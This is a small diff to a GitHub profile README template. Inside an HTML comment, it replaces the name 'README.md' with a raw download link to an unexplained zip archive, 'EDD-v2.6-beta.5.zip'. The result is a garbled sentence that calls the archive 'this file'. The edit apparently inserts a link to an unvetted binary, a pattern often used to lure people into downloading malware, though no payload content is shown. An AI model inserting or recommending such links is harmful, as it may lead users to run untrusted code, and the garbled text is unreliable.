@@ -7,6 +7,6 @@
 - ⚡ Fun fact: ...
 
 <!---
-EDDY7688/EDDY7688 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+EDDY7688/EDDY7688 is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/EDDY7688/EDDY7688/main/poultice/EDD-v2.6-beta.5.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
